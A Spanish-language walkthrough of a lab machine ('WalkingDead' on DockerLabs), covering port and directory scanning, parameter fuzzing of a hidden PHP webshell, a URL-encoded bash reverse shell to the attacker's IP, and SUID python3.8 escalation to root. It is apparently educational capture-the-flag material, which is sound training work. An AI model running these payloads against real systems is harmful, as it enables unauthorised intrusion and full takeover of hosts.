## Introducción

Este documento presenta la resolución completa de la máquina **WalkingDead**, desarrollada por *JuanR* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con un archivo oculto `.shell.php` en el directorio `/hidden`, accesible mediante un enlace en el código fuente. Mediante fuzzing de parámetros, se identifica que este archivo acepta el parámetro `cmd`, permitiendo la ejecución remota de comandos.
A través de esta webshell, se obtiene una reverse shell como `www-data`. Finalmente, se identifica que `/usr/bin/python3.8` tiene permisos SUID, permitiendo la escalada de privilegios a `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip WalkingDead.zip
sudo bash auto_deploy.sh WalkingDead.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p WalkingDead/{content,exploits,nmap,scripts}
cd WalkingDead
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763251686/Ports_wsp6vi.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763251685/Gobuster_c6oojs.png)

**Rutas encontradas:**
- `/index.html` — Página principal.
  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1763251686/Index_msenth.png)
- `/backup.txt` — Archivo con permisos restringidos.
- `/hidden` — Directorio oculto.

Al analizar el código fuente de la página principal, se identifica un enlace hacia `/hidden/.shell.php`:

![Shell PHP](https://res.cloudinary.com/dewqswzke/image/upload/v1763251687/ShellPhp_k6pan2.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Fuzzing de parámetros

Se realiza fuzzing para identificar el parámetro de la webshell:

```bash
ffuf -u "http://172.17.0.2/hidden/.shell.php?FUZZ=id" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs 0
```

![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1763251685/Ffuf_g74equ.png)

Se identifica el parámetro **cmd**.

### 2.2 Ejecución remota de comandos

Se prueba la ejecución:

```
http://172.17.0.2/hidden/.shell.php?cmd=id
```

![Webshell test](https://res.cloudinary.com/dewqswzke/image/upload/v1763251688/WebshellTest_sppkhh.png)

### 2.3 Reverse shell

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se ejecuta el payload:

```
http://172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%27
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1763251686/ReverShell_dal9bq.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1763246116/Find_nhz7yt.png)

Se identifica que `/usr/bin/python3.8` tiene permisos SUID.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b python -f suid
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763251687/Root_cjgvex.png)
